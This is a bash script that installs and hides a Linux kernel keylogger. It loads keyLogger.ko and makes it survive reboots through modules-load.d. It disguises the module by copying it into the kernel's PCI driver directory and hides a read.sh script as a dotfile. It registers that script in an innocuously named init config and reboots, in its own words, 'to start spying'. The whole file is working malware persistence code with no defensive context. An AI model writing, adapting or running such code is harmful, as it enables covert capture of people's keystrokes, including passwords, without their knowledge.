#!/bin/bash

#starts the key logger now
sudo insmod keyLogger.ko

# Make it resilent to reboot
sudo bash -c  'echo keyLogger >> /etc/modules-load.d/keyLogger.conf'
sudo cp ./keyLogger.ko /lib/modules/$(uname -r)/kernel/drivers/pci
sudo depmod

# Create the script to copy and put it in boot sequence
cp ./read.sh ~/Downloads
mv ~/Downloads/read.sh ~/Downloads/.read.sh
sudo touch /etc/init/nu11.config
sudo bash -c 'echo start on startup >> /etc/init/nu11.config'
sudo bash -c 'echo task >> /etc/init/nu11.config'
sudo bash -c 'echo exec ~/Downloads/.read.sh >> /etc/init/nu11.config'

# Restart Computer to start spying
shutdown -r 0
